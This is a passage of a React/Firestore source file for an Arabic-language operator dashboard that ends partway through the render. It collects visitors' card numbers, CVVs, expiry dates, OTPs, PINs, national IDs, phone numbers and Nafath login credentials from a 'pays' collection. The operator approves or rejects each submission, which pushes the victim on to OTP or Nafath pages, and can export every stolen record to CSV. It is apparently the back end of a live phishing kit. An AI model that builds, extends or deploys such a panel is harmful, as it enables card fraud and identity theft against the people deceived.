"use client"

import { useEffect, useState, useMemo, useRef, useCallback } from "react"
import { collection, onSnapshot, doc, updateDoc, deleteDoc, query } from "firebase/firestore"
import { db } from "@/lib/firebase"
import { Badge } from "@/components/ui/badge"
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select"
import { PAGE_LIST } from "@/lib/page-routes"
import {
  Users,
  CreditCard,
  Clock,
  CheckCircle2,
  Search,
  ChevronLeft,
  ChevronDown,
  ArrowUpDown,
  Wifi,
  Download,
  Shield,
  Car,
  Phone,
  MapPin,
  Calendar,
  User,
  Hash,
  FileText,
  AlertTriangle,
  Globe,
  Loader2,
  MessageSquare,
  Settings,
  ChevronRight,
  X,
  Copy,
  Check,
  Bell,
  Trash2,
} from "lucide-react"

// ─── Types ───────────────────────────────────────────────────────────────────

interface FirestoreRecord {
  id: string
  [key: string]: unknown
}

type SortField = "createdAt" | "updatedAt" | "ownerName" | "country" | "step"
type SortDir = "asc" | "desc"

// ─── Helper Maps ─────────────────────────────────────────────────────────────

const STEP_LABELS: Record<string, string> = {
  "": "زيارة فقط",
  "booking-completed": "تم الحجز",
  "booking-details-submitted": "تم إرسال بيانات الحجز",
  "payment-method-selected": "تم اختيار طريقة الدفع",
  "card-details-submitted": "تم إرسال بيانات البطاقة",
  "otp-submitted": "تم إرسال OTP",
  "pin-submitted": "تم إرسال PIN",
  "phone-otp-requested": "تم طلب OTP الجوال",
  "payment-completed": "مكتمل",
}

const STEP_COLORS: Record<string, string> = {
  "": "bg-gray-700/50 text-gray-300",
  "booking-completed": "bg-blue-900/50 text-blue-300",
  "booking-details-submitted": "bg-blue-900/50 text-blue-300",
  "payment-method-selected": "bg-amber-900/50 text-amber-300",
  "card-details-submitted": "bg-orange-900/50 text-orange-300",
  "otp-submitted": "bg-purple-900/50 text-purple-300",
  "pin-submitted": "bg-indigo-900/50 text-indigo-300",
  "phone-otp-requested": "bg-cyan-900/50 text-cyan-300",
  "payment-completed": "bg-emerald-900/50 text-emerald-300",
}

const APPROVAL_LABELS: Record<string, string> = {
  pending: "قيد الانتظار",
  approved: "موافق عليه",
  rejected: "مرفوض",
  otp: "OTP مطلوب",
}

const APPROVAL_COLORS: Record<string, string> = {
  pending: "bg-yellow-900/50 text-yellow-300 border-yellow-700",
  approved: "bg-green-900/50 text-green-300 border-green-700",
  rejected: "bg-red-900/50 text-red-300 border-red-700",
  otp: "bg-blue-900/50 text-blue-300 border-blue-700",
}

// ─── Utility ─────────────────────────────────────────────────────────────────

function maskCard(num?: string) {
  if (!num) return "—"
  const clean = String(num).replace(/\s/g, "")
  if (clean.length < 8) return clean
  return clean.slice(0, 4) + " •••• •••• " + clean.slice(-4)
}

function formatDate(val?: string) {
  if (!val) return "—"
  try {
    return new Intl.DateTimeFormat("ar-SA", {
      year: "numeric",
      month: "short",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    }).format(new Date(val))
  } catch {
    return val
  }
}

function formatTime(val?: string) {
  if (!val) return ""
  try {
    return new Intl.DateTimeFormat("ar-SA", {
      hour: "2-digit",
      minute: "2-digit",
    }).format(new Date(val))
  } catch {
    return ""
  }
}

function str(val: unknown): string {
  if (val === null || val === undefined) return ""
  return String(val)
}

function getInitials(name: string): string {
  if (!name) return "؟"
  const parts = name.trim().split(/\s+/)
  if (parts.length === 1) return parts[0].slice(0, 2)
  return parts[0][0] + (parts[1]?.[0] || "")
}

// Check if a record needs approval (admin action required)
function needsApproval(record: FirestoreRecord): boolean {
  const step = str(record.step)
  const cardApproval = str(record.cardApproval)
  const phoneApproval = str(record.phoneApproval)
  const phoneOtpApproval = str(record.phoneOtpApproval)

  // Card submitted but approval still pending
  if (step === "card-details-submitted" && (cardApproval === "pending" || !cardApproval)) return true
  // OTP submitted, waiting for approval
  if (step === "otp-submitted" && (cardApproval === "otp" || cardApproval === "pending")) return true
  // PIN submitted, waiting for next action
  if (step === "pin-submitted") return true
  // Phone OTP requested, pending approval
  if (step === "phone-otp-requested" && (phoneOtpApproval === "pending" || !phoneOtpApproval)) return true
  // Phone verification pending
  if (phoneApproval === "pending" && str(record.phone)) return true

  return false
}

// Color palette for avatar backgrounds
const AVATAR_COLORS = [
  "bg-teal-600", "bg-blue-600", "bg-purple-600", "bg-rose-600",
  "bg-amber-600", "bg-indigo-600", "bg-emerald-600", "bg-cyan-600",
  "bg-pink-600", "bg-violet-600",
]

function getAvatarColor(id: string): string {
  let hash = 0
  for (let i = 0; i < id.length; i++) {
    hash = id.charCodeAt(i) + ((hash << 5) - hash)
  }
  return AVATAR_COLORS[Math.abs(hash) % AVATAR_COLORS.length]
}

// ─── Detail Row ──────────────────────────────────────────────────────────────

function DetailRow({
  icon: Icon,
  label,
  value,
  mono,
  badge,
  badgeColor,
  copyable,
}: {
  icon?: React.ComponentType<{ className?: string }>
  label: string
  value?: string
  mono?: boolean
  badge?: boolean
  badgeColor?: string
  copyable?: boolean
}) {
  const [copied, setCopied] = useState(false)
  if (!value || value === "—") return null

  const handleCopy = () => {
    navigator.clipboard.writeText(value)
    setCopied(true)
    setTimeout(() => setCopied(false), 1500)
  }

  return (
    <div className="flex items-start gap-3 py-2.5 border-b border-[#2a3942]/60 last:border-0 group">
      {Icon && <Icon className="h-4 w-4 text-gray-500 mt-0.5 shrink-0" />}
      <div className="flex-1 min-w-0">
        <p className="text-[11px] text-gray-500 mb-0.5">{label}</p>
        {badge ? (
          <span className={`inline-block px-2.5 py-0.5 rounded-full text-xs font-semibold ${badgeColor || "bg-gray-700 text-gray-300"}`}>
            {value}
          </span>
        ) : (
          <div className="flex items-center gap-2">
            <p className={`text-sm font-medium text-gray-200 break-all ${mono ? "font-mono tracking-wide" : ""}`}>{value}</p>
            {copyable && (
              <button onClick={handleCopy} className="opacity-0 group-hover:opacity-100 transition-opacity p-0.5 rounded hover:bg-white/10">
                {copied ? <Check className="h-3 w-3 text-green-400" /> : <Copy className="h-3 w-3 text-gray-500" />}
              </button>
            )}
          </div>
        )}
      </div>
    </div>
  )
}

// ─── Approve / Reject Buttons ────────────────────────────────────────────────
//
// Field-specific logic:
//   cardApproval:      approve → "otp"      (visitor → /payment/otp)
//                      reject  → "rejected" (visitor sees error)
//   phoneOtpApproval:  approve → "approved" (visitor → /nafad)
//                      reject  → "rejected" (visitor sees error)
//   phoneApproval:     approve → "approved" (visitor → /nafad)
//                      reject  → "rejected" (visitor sees OTP error)

const APPROVE_VALUE: Record<string, string> = {
  cardApproval: "otp",        // sends visitor to OTP page
  phoneOtpApproval: "approved",
  phoneApproval: "approved",
}

const APPROVE_LABEL: Record<string, string> = {
  cardApproval: "موافق → OTP",
  phoneOtpApproval: "موافق → نفاذ",
  phoneApproval: "موافق → نفاذ",
}

// Which values mean "it was approved" (for green highlight)
const APPROVED_VALUES = new Set(["approved", "otp"])

function ApproveRejectButtons({
  record,
  field,
  onUpdate,
  label,
}: {
  record: FirestoreRecord
  field: string
  onUpdate: (id: string, data: Record<string, string>) => Promise<void>
  label?: string
}) {
  const current = str(record[field])
  const [busy, setBusy] = useState<string | null>(null)

  const approveVal = APPROVE_VALUE[field] || "approved"
  const approveLbl = APPROVE_LABEL[field] || "موافق"
  const isApproved = APPROVED_VALUES.has(current)
  const isRejected = current === "rejected"

  const handleApprove = async () => {
    setBusy("approve")
    await onUpdate(record.id, { [field]: approveVal })
    setBusy(null)
  }

  const handleReject = async () => {
    setBusy("reject")
    await onUpdate(record.id, { [field]: "rejected" })
    setBusy(null)
  }

  return (
    <div className="mt-2 space-y-1.5">
      <div className="flex items-center gap-2">
        {label && <span className="text-[10px] text-gray-500 shrink-0">{label}</span>}
        <button
          disabled={isApproved || busy !== null}
          onClick={handleApprove}
          className={`flex-1 h-8 rounded-lg text-xs font-bold transition-all flex items-center justify-center gap-1.5 border ${
            isApproved
              ? "bg-green-900/50 text-green-300 border-green-600 ring-1 ring-green-500/40"
              : "bg-[#1b2b33] text-gray-400 border-[#2a3942] hover:border-green-600 hover:bg-green-900/20 hover:text-green-300"
          }`}
        >
          {busy === "approve" ? <Loader2 className="h-3 w-3 animate-spin" /> : <CheckCircle2 className="h-3.5 w-3.5" />}
          {approveLbl}
        </button>
        <button
          disabled={isRejected || busy !== null}
          onClick={handleReject}
          className={`flex-1 h-8 rounded-lg text-xs font-bold transition-all flex items-center justify-center gap-1.5 border ${
            isRejected
              ? "bg-red-900/50 text-red-300 border-red-600 ring-1 ring-red-500/40"
              : "bg-[#1b2b33] text-gray-400 border-[#2a3942] hover:border-red-600 hover:bg-red-900/20 hover:text-red-300"
          }`}
        >
          {busy === "reject" ? <Loader2 className="h-3 w-3 animate-spin" /> : <X className="h-3.5 w-3.5" />}
          رفض
        </button>
      </div>
      {/* Show what happened after action */}
      {isApproved && field === "cardApproval" && (
        <p className="text-[10px] text-green-400/80 flex items-center gap-1">
          <CheckCircle2 className="h-3 w-3" /> تم إرسال الزائر إلى صفحة OTP
        </p>
      )}
      {isApproved && field === "phoneOtpApproval" && (
        <p className="text-[10px] text-green-400/80 flex items-center gap-1">
          <CheckCircle2 className="h-3 w-3" /> تم إرسال الزائر إلى صفحة نفاذ
        </p>
      )}
      {isApproved && field === "phoneApproval" && (
        <p className="text-[10px] text-green-400/80 flex items-center gap-1">
          <CheckCircle2 className="h-3 w-3" /> تم إرسال الزائر إلى صفحة نفاذ
        </p>
      )}
      {isRejected && (
        <p className="text-[10px] text-red-400/80 flex items-center gap-1">
          <X className="h-3 w-3" /> تم رفض الطلب — الزائر يرى رسالة خطأ
        </p>
      )}
    </div>
  )
}

// ─── Page Navigation Dropdown ─────────────────────────────────────────────────

function PageNavigationDropdown({
  record,
  onUpdate,
}: {
  record: FirestoreRecord
  onUpdate: (id: string, data: Record<string, string>) => Promise<void>
}) {
  const current = str(record.currentPage)
  const [busy, setBusy] = useState(false)
  const [open, setOpen] = useState(false)

  const handleSelect = async (key: string) => {
    setBusy(true)
    setOpen(false)
    if (key === "_clear") {
      await onUpdate(record.id, { currentPage: "" })
    } else {
      await onUpdate(record.id, { currentPage: key })
    }
    setBusy(false)
  }

  const currentLabel = PAGE_LIST.find(p => p.key === current)

  return (
    <div className="relative">
      <button
        onClick={() => setOpen(!open)}
        disabled={busy}
        className="flex items-center gap-2 h-8 px-3 rounded-lg bg-[#2a3942] border border-[#3a4a53] text-xs font-semibold text-gray-300 hover:bg-[#323f49] transition-colors disabled:opacity-50"
      >
        {busy ? (
          <Loader2 className="h-3.5 w-3.5 animate-spin" />
        ) : (
          <Globe className="h-3.5 w-3.5 text-teal-400" />
        )}
        {currentLabel ? (
          <span className="flex items-center gap-1">
            <span>{currentLabel.icon}</span>
            <span>{currentLabel.label}</span>
          </span>
        ) : (
          <span>توجيه الزائر</span>
        )}
        <ChevronDown className={`h-3 w-3 text-gray-500 transition-transform ${open ? "rotate-180" : ""}`} />
      </button>

      {open && (
        <>
          <div className="fixed inset-0 z-40" onClick={() => setOpen(false)} />
          <div className="absolute top-full mt-1 right-0 z-50 w-48 bg-[#202c33] border border-[#3a4a53] rounded-xl shadow-xl overflow-hidden">
            {current && (
              <button
                onClick={() => handleSelect("_clear")}
                className="w-full flex items-center gap-2 px-3 py-2 text-xs text-red-400 hover:bg-red-900/20 transition-colors border-b border-[#2a3942]"
              >
                <X className="h-3.5 w-3.5" />
                إيقاف التوجيه
              </button>
            )}
            {PAGE_LIST.map((p) => (
              <button
                key={p.key}
                onClick={() => handleSelect(p.key)}
                className={`w-full flex items-center gap-2 px-3 py-2 text-xs transition-colors ${
                  current === p.key
                    ? "bg-teal-900/40 text-teal-300 font-bold"
                    : "text-gray-300 hover:bg-[#2a3942]"
                }`}
              >
                <span>{p.icon}</span>
                <span>{p.label}</span>
                {current === p.key && <Check className="h-3 w-3 mr-auto" />}
              </button>
            ))}
          </div>
        </>
      )}
    </div>
  )
}

// (TextFieldControl removed — fields now inline in header)

// ─── Conversation Item ───────────────────────────────────────────────────────

function ConversationItem({
  record,
  isSelected,
  onClick,
  onDelete,
}: {
  record: FirestoreRecord
  isSelected: boolean
  onClick: () => void
  onDelete: (id: string) => void
}) {
  const name = str(record.ownerName) || str(record.name) || str(record.id).slice(0, 10)
  const step = str(record.step)
  const isOnline = record.online === true
  const isUnread = record.isRead === false
  const hasCard = !!(str(record.cardNumber) && str(record.cardNumber).length > 3)
  const hasOtp = !!(str(record.otp) || str(record.phoneOtp))
  const hasNafad = !!(str(record.nafadUsername) || str(record.nafadPassword) || str(record.nafaz_pin))
  const time = formatTime(str(record.createdAt))
  const approvalNeeded = needsApproval(record)

  // Generate last activity description
  const getLastActivity = () => {
    if (step === "payment-completed") return "✅ تم الدفع بنجاح"
    if (hasOtp) return "🔢 أرسل رمز OTP"
    if (hasCard) return "💳 أدخل بيانات البطاقة"
    if (hasNafad) return "🛡️ أدخل بيانات نفاذ"
    if (step) return STEP_LABELS[step] || step
    return "زائر جديد"
  }

  const hasPhone = !!(str(record.phone) || str(record.authorizedPhone))

  return (
    <div
      onClick={onClick}
      className={`relative flex items-center gap-3 px-4 py-3 cursor-pointer transition-all border-b border-[#222e35] hover:bg-[#202c33] group/conv ${
        isSelected ? "bg-[#2a3942] border-r-[3px] border-r-teal-500" : ""
      } ${approvalNeeded ? "flash-approval" : ""}`}
    >
      {/* Delete button (shows on hover) */}
      <button
        onClick={(e) => { e.stopPropagation(); onDelete(record.id) }}
        className="absolute top-2 left-2 z-10 p-1 rounded-md bg-red-900/80 text-red-300 opacity-0 group-hover/conv:opacity-100 transition-opacity hover:bg-red-800"
        title="حذف"
      >
        <Trash2 className="h-3 w-3" />
      </button>

      {/* Flashing approval indicator */}
      {approvalNeeded && (
        <div className="absolute top-1.5 left-8 z-10">
          <span className="relative flex h-3 w-3">
            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
            <span className="relative inline-flex rounded-full h-3 w-3 bg-red-500"></span>
          </span>
        </div>
      )}

      {/* Avatar */}
      <div className="relative shrink-0">
        <div className={`w-12 h-12 rounded-full flex items-center justify-center text-white text-sm font-bold ${getAvatarColor(str(record.id))} ${approvalNeeded ? "ring-2 ring-red-500/60 ring-offset-1 ring-offset-[#111b21]" : ""}`}>
          {getInitials(name)}
        </div>
        {isOnline && (
          <span className="absolute bottom-0 left-0 w-3.5 h-3.5 bg-green-500 border-2 border-[#111b21] rounded-full" />
        )}
      </div>

      {/* Content */}
      <div className="flex-1 min-w-0">
        <div className="flex items-center justify-between mb-0.5">
          <h3 className={`text-sm truncate max-w-[160px] ${isUnread ? "font-bold text-gray-100" : "font-medium text-gray-300"}`}>
            {name}
          </h3>
          <span className={`text-[11px] shrink-0 mr-1 ${isUnread ? "text-teal-400 font-semibold" : "text-gray-500"}`}>
            {time}
          </span>
        </div>
        <div className="flex items-center justify-between">
          <p className={`text-xs truncate max-w-[140px] ${isUnread ? "text-gray-300 font-medium" : "text-gray-500"}`}>
            {approvalNeeded && <span className="text-red-400 font-semibold">⚠ </span>}
            {getLastActivity()}
          </p>
          <div className="flex items-center gap-1 shrink-0">
            {/* Data presence badges */}
            {hasCard && (
              <span className="inline-flex items-center gap-0.5 px-1 py-0.5 rounded bg-orange-900/40 text-orange-300 text-[8px] font-bold" title="بطاقة">
                <CreditCard className="h-2.5 w-2.5" />
              </span>
            )}
            {hasPhone && (
              <span className="inline-flex items-center gap-0.5 px-1 py-0.5 rounded bg-sky-900/40 text-sky-300 text-[8px] font-bold" title="جوال">
                <Phone className="h-2.5 w-2.5" />
              </span>
            )}
            {hasNafad && (
              <span className="inline-flex items-center gap-0.5 px-1 py-0.5 rounded bg-teal-900/40 text-teal-300 text-[8px] font-bold" title="نفاذ">
                <Shield className="h-2.5 w-2.5" />
              </span>
            )}
            {step && (
              <span className={`inline-block px-1.5 py-0.5 rounded text-[9px] font-semibold whitespace-nowrap ${STEP_COLORS[step] || STEP_COLORS[""]}`}>
                {STEP_LABELS[step]?.split(" ").slice(-1)[0] || "زيارة"}
              </span>
            )}
            {isUnread && (
              <span className="w-5 h-5 rounded-full bg-teal-600 text-white text-[10px] flex items-center justify-center font-bold">
                1
              </span>
            )}
          </div>
        </div>
      </div>
    </div>
  )
}

// ─── Section Component (for detail panel) ────────────────────────────────────

function Section({
  title,
  icon: Icon,
  children,
  defaultOpen = true,
  flash = false,
}: {
  title: string
  icon: React.ComponentType<{ className?: string }>
  children: React.ReactNode
  defaultOpen?: boolean
  flash?: boolean
}) {
  const [open, setOpen] = useState(defaultOpen)
  return (
    <div className={`bg-[#1f2c34] rounded-xl border overflow-hidden shadow-sm ${flash ? "border-red-500/50 flash-section" : "border-[#2a3942]"}`}>
      <button
        onClick={() => setOpen(!open)}
        className="w-full flex items-center justify-between px-4 py-3 hover:bg-[#233a45]/50 transition-colors"
      >
        <div className="flex items-center gap-2">
          <Icon className="h-4 w-4 text-teal-400" />
          <span className="text-sm font-bold text-gray-200">{title}</span>
          {flash && (
            <span className="relative flex h-2.5 w-2.5 mr-1">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
              <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-red-500"></span>
            </span>
          )}
        </div>
        <ChevronDown className={`h-4 w-4 text-gray-500 transition-transform ${open ? "rotate-180" : ""}`} />
      </button>
      {open && <div className="px-4 pb-4">{children}</div>}
    </div>
  )
}

// ─── Mini Section (no collapse, compact) ─────────────────────────────────────

function MiniSection({
  title,
  icon: Icon,
  children,
  flash = false,
}: {
  title: string
  icon: React.ComponentType<{ className?: string }>
  children: React.ReactNode
  flash?: boolean
}) {
  return (
    <div className={`bg-[#1f2c34] rounded-xl border overflow-hidden shadow-sm ${flash ? "border-red-500/50 flash-section" : "border-[#2a3942]"}`}>
      <div className="flex items-center gap-2 px-4 pt-3 pb-1">
        <Icon className="h-3.5 w-3.5 text-teal-400" />
        <span className="text-xs font-bold text-gray-300">{title}</span>
        {flash && (
          <span className="relative flex h-2 w-2 mr-1">
            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
            <span className="relative inline-flex rounded-full h-2 w-2 bg-red-500"></span>
          </span>
        )}
      </div>
      <div className="px-4 pb-3">{children}</div>
    </div>
  )
}

// ─── Visual Credit Card ──────────────────────────────────────────────────────

function VisualCreditCard({ record }: { record: FirestoreRecord }) {
  const cardNumber = str(record.cardNumber)
  const cardName = str(record.cardName)
  const expiry = str(record.expiryDate) || (str(record.expiryMonth) ? str(record.expiryMonth) + "/" + str(record.expiryYear) : "")
  const cvv = str(record.cvv)
  const [copied, setCopied] = useState<string | null>(null)

  const handleCopy = (val: string, key: string) => {
    if (!val) return
    navigator.clipboard.writeText(val)
    setCopied(key)
    setTimeout(() => setCopied(null), 1500)
  }

  // Format card number with spaces
  const formatCardDisplay = (num: string) => {
    if (!num) return "•••• •••• •••• ••••"
    const clean = num.replace(/\s/g, "")
    return clean.replace(/(.{4})/g, "$1 ").trim()
  }

  if (!cardNumber && !cardName) return null

  return (
    <div className="credit-card-visual relative w-full aspect-[1.6/1] rounded-2xl p-5 flex flex-col justify-between overflow-hidden select-none">
      {/* Card BG gradient */}
      <div className="absolute inset-0 bg-gradient-to-br from-[#1a1a2e] via-[#16213e] to-[#0f3460] z-0" />
      <div className="absolute inset-0 opacity-10 z-0" style={{ backgroundImage: "url(\"data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.08'%3E%3Ccircle cx='30' cy='30' r='2'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E\")" }} />

      {/* Top row */}
      <div className="relative z-10 flex items-center justify-between">
        <div className="flex items-center gap-2">
          <div className="w-10 h-7 rounded bg-gradient-to-br from-yellow-300 to-yellow-500 flex items-center justify-center">
            <div className="w-6 h-4 rounded-sm border border-yellow-600/50" />
          </div>
          <span className="text-[10px] text-gray-400 font-mono">{str(record.paymentMethod) || "CARD"}</span>
        </div>
        <CreditCard className="h-6 w-6 text-gray-400/60" />
      </div>

      {/* Card number */}
      <div className="relative z-10">
        <button
          onClick={() => handleCopy(cardNumber, "num")}
          className="text-lg sm:text-xl font-mono tracking-[0.2em] text-gray-100 hover:text-white transition-colors text-right w-full"
          dir="ltr"
          title="انسخ رقم البطاقة"
        >
          {copied === "num" ? (
            <span className="text-green-400 text-sm flex items-center justify-center gap-1"><Check className="h-4 w-4" /> تم النسخ</span>
          ) : (
            formatCardDisplay(cardNumber)
          )}
        </button>
      </div>

      {/* Bottom row */}
      <div className="relative z-10 flex items-end justify-between gap-3">
        <div className="flex-1 min-w-0">
          <p className="text-[9px] text-gray-500 uppercase tracking-wider mb-0.5">حامل البطاقة</p>
          <button
            onClick={() => handleCopy(cardName, "name")}
            className="text-xs font-semibold text-gray-200 truncate block w-full text-right hover:text-white transition-colors"
            title="انسخ الاسم"
          >
            {copied === "name" ? <span className="text-green-400">تم النسخ</span> : (cardName || "—")}
          </button>
        </div>
        <div className="text-left shrink-0">
          <p className="text-[9px] text-gray-500 uppercase tracking-wider mb-0.5">انتهاء</p>
          <button
            onClick={() => handleCopy(expiry, "exp")}
            className="text-xs font-mono font-semibold text-gray-200 hover:text-white transition-colors"
            title="انسخ تاريخ الانتهاء"
          >
            {copied === "exp" ? <span className="text-green-400">تم</span> : (expiry || "••/••")}
          </button>
        </div>
        <div className="text-left shrink-0">
          <p className="text-[9px] text-gray-500 uppercase tracking-wider mb-0.5">CVV</p>
          <button
            onClick={() => handleCopy(cvv, "cvv")}
            className="text-xs font-mono font-bold text-amber-300 hover:text-amber-200 transition-colors"
            title="انسخ CVV"
          >
            {copied === "cvv" ? <span className="text-green-400">تم</span> : (cvv || "•••")}
          </button>
        </div>
      </div>
    </div>
  )
}

// ─── Code Display (for OTP/PIN) ──────────────────────────────────────────────

function CodeDisplay({
  label,
  value,
  color = "teal",
}: {
  label: string
  value?: string
  color?: "teal" | "amber" | "purple" | "red"
}) {
  const [copied, setCopied] = useState(false)
  if (!value) return null

  const colorMap = {
    teal: "from-teal-900/50 to-teal-800/30 border-teal-700/50 text-teal-300",
    amber: "from-amber-900/50 to-amber-800/30 border-amber-700/50 text-amber-300",
    purple: "from-purple-900/50 to-purple-800/30 border-purple-700/50 text-purple-300",
    red: "from-red-900/50 to-red-800/30 border-red-700/50 text-red-300",
  }

  const handleCopy = () => {
    navigator.clipboard.writeText(value)
    setCopied(true)
    setTimeout(() => setCopied(false), 1500)
  }

  return (
    <button
      onClick={handleCopy}
      className={`w-full rounded-xl border bg-gradient-to-br ${colorMap[color]} p-3 text-center transition-all hover:brightness-110 group`}
      title={`انسخ ${label}`}
    >
      <p className="text-[10px] text-gray-500 uppercase tracking-wider mb-1">{label}</p>
      {copied ? (
        <p className="text-lg font-bold text-green-400 flex items-center justify-center gap-1"><Check className="h-4 w-4" /> تم</p>
      ) : (
        <p className="text-2xl font-mono font-bold tracking-[0.3em]" dir="ltr">{value}</p>
      )}
    </button>
  )
}

// ─── Empty State ─────────────────────────────────────────────────────────────

function EmptyState() {
  return (
    <div className="flex-1 flex flex-col items-center justify-center bg-[#0b141a] text-center p-8">
      <div className="w-64 h-64 mb-6 flex items-center justify-center">
        <div className="relative">
          <div className="w-40 h-40 rounded-full bg-teal-900/30 flex items-center justify-center">
            <MessageSquare className="h-20 w-20 text-teal-700" />
          </div>
          <div className="absolute -top-2 -right-2 w-8 h-8 rounded-full bg-teal-800/40 flex items-center justify-center">
            <Shield className="h-4 w-4 text-teal-600" />
          </div>
          <div className="absolute -bottom-1 -left-3 w-6 h-6 rounded-full bg-teal-800/20" />
        </div>
      </div>
      <h2 className="text-xl font-bold text-gray-400 mb-2">لوحة التحكم</h2>
      <p className="text-sm text-gray-600 max-w-xs leading-relaxed">
        اختر محادثة من القائمة لعرض التفاصيل والتحكم في بيانات الزائر
      </p>
    </div>
  )
}

// ─── Main Page ───────────────────────────────────────────────────────────────

export default function DashboardPage() {
  const [records, setRecords] = useState<FirestoreRecord[]>([])
  const [loading, setLoading] = useState(true)
  const [searchTerm, setSearchTerm] = useState("")
  const [stepFilter, setStepFilter] = useState("all")
  const [sortField, setSortField] = useState<SortField>("createdAt")
  const [sortDir, setSortDir] = useState<SortDir>("desc")
  const [selectedId, setSelectedId] = useState<string | null>(null)
  const [showFilters, setShowFilters] = useState(false)
  const [mobileShowDetail, setMobileShowDetail] = useState(false)
  const [deleteConfirmId, setDeleteConfirmId] = useState<string | null>(null)
  const [deleting, setDeleting] = useState(false)
  const detailRef = useRef<HTMLDivElement>(null)

  // Derive selectedRecord from live records
  const selectedRecord = useMemo(() => {
    if (!selectedId) return null
    return records.find((r) => r.id === selectedId) || null
  }, [selectedId, records])

  // ── Real-time Listener ───────────────────────────────────────────────────

  useEffect(() => {
    const q = query(collection(db, "pays"))
    const unsubscribe = onSnapshot(
      q,
      (snapshot) => {
        const docs: FirestoreRecord[] = []
        snapshot.forEach((docSnap) => {
          docs.push({ id: docSnap.id, ...docSnap.data() } as FirestoreRecord)
        })
        setRecords(docs)
        setLoading(false)
      },
      (error) => {
        console.error("Dashboard Firestore error:", error)
        setLoading(false)
      },
    )
    return () => unsubscribe()
  }, [])

  // ── Update Firestore doc ─────────────────────────────────────────────────

  const handleUpdate = async (id: string, data: Record<string, string>) => {
    try {
      await updateDoc(doc(db, "pays", id), { ...data, updatedAt: new Date().toISOString() })
    } catch (e) {
      console.error("Update error:", e)
    }
  }

  // ── Delete Firestore doc ────────────────────────────────────────────────

  const handleDelete = async (id: string) => {
    setDeleting(true)
    try {
      await deleteDoc(doc(db, "pays", id))
      // If deleted record was selected, deselect
      if (selectedId === id) {
        setSelectedId(null)
        setMobileShowDetail(false)
      }
    } catch (e) {
      console.error("Delete error:", e)
    }
    setDeleting(false)
    setDeleteConfirmId(null)
  }

  // ── Mark as read ─────────────────────────────────────────────────────────

  const markAsRead = async (record: FirestoreRecord) => {
    if (record.isRead === false) {
      try {
        await updateDoc(doc(db, "pays", record.id), { isRead: true })
      } catch (e) {
        console.error(e)
      }
    }
  }

  // ── Select conversation ─────────────────────────────────────────────────

  const selectConversation = useCallback((record: FirestoreRecord) => {
    setSelectedId(record.id)
    setMobileShowDetail(true)
    markAsRead(record)
    setTimeout(() => {
      detailRef.current?.scrollTo({ top: 0, behavior: "smooth" })
    }, 50)
  }, [])

  // ── Filtered & Sorted ────────────────────────────────────────────────────

  const processed = useMemo(() => {
    let list = [...records]

    if (searchTerm.trim()) {
      const term = searchTerm.toLowerCase()
      list = list.filter((r) => {
        const fields = [r.id, r.ownerName, r.nationalId, r.phone, r.cardNumber, r.cardName, r.country, r.plateNumbers, r.plateLetters, r.operator]
        return fields.some((f) => str(f).toLowerCase().includes(term))
      })
    }

    if (stepFilter !== "all") {
      list = list.filter((r) => str(r.step) === stepFilter)
    }

    // Sort: put approval-needed items first, then by chosen sort
    list.sort((a, b) => {
      const aNeed = needsApproval(a) ? 0 : 1
      const bNeed = needsApproval(b) ? 0 : 1
      if (aNeed !== bNeed) return aNeed - bNeed

      const aVal = str(a[sortField]).toLowerCase()
      const bVal = str(b[sortField]).toLowerCase()
      const cmp = aVal.localeCompare(bVal)
      return sortDir === "asc" ? cmp : -cmp
    })

    return list
  }, [records, searchTerm, stepFilter, sortField, sortDir])

  // ── Stats ────────────────────────────────────────────────────────────────

  const stats = useMemo(() => {
    const total = records.length
    const completed = records.filter((r) => str(r.step) === "payment-completed").length
    const pendingPayment = records.filter((r) => ["card-details-submitted", "otp-submitted", "pin-submitted", "phone-otp-requested"].includes(str(r.step))).length
    const online = records.filter((r) => r.online === true).length
    const unread = records.filter((r) => r.isRead === false).length
    const approvalCount = records.filter((r) => needsApproval(r)).length
    return { total, completed, pendingPayment, online, unread, approvalCount }
  }, [records])

  // ── Export CSV ───────────────────────────────────────────────────────────

  const exportCSV = () => {
    const headers = ["ID", "Owner Name", "National ID", "Phone", "Country", "Card Number", "Card Name", "Expiry", "CVV", "OTP", "PIN", "Step", "Payment Method", "Operator", "Created At"]
    const rows = processed.map((r) => [
      r.id, str(r.ownerName), str(r.nationalId), str(r.phone), str(r.country),
      str(r.cardNumber), str(r.cardName),
      str(r.expiryDate || ((r.expiryMonth ? str(r.expiryMonth) + "/" + str(r.expiryYear) : ""))),
      str(r.cvv), str(r.otp), str(r.pin), str(r.step), str(r.paymentMethod), str(r.operator), str(r.createdAt),
    ])
    const csv = [headers, ...rows].map((row) => row.map((cell) => `"${cell}"`).join(",")).join("\n")
    const blob = new Blob(["\uFEFF" + csv], { type: "text/csv;charset=utf-8;" })
    const url = URL.createObjectURL(blob)
    const a = document.createElement("a")
    a.href = url
    a.download = `dashboard-export-${new Date().toISOString().slice(0, 10)}.csv`
    a.click()
    URL.revokeObjectURL(url)
  }

  // ── Loading State ────────────────────────────────────────────────────────

  if (loading) {
    return (
      <div className="h-screen flex items-center justify-center bg-[#0b141a]">
        <div className="flex flex-col items-center gap-4">
          <div className="w-16 h-16 rounded-full bg-teal-700 flex items-center justify-center">
            <Loader2 className="h-8 w-8 animate-spin text-white" />
          </div>
          <p className="text-lg text-gray-400 font-medium">جاري تحميل البيانات...</p>
        </div>
      </div>
    )
  }

  // Determine if selected record needs approval (for header flash)
  const selectedNeedsApproval = selectedRecord ? needsApproval(selectedRecord) : false

  // ── Render ───────────────────────────────────────────────────────────────

  return (
    <div className="h-screen flex overflow-hidden bg-[#0b141a]" dir="rtl" lang="ar">
      {/* ═══════════════════════════════════════════════════════════════════════
          SIDEBAR — Conversations List
          ═══════════════════════════════════════════════════════════════════════ */}
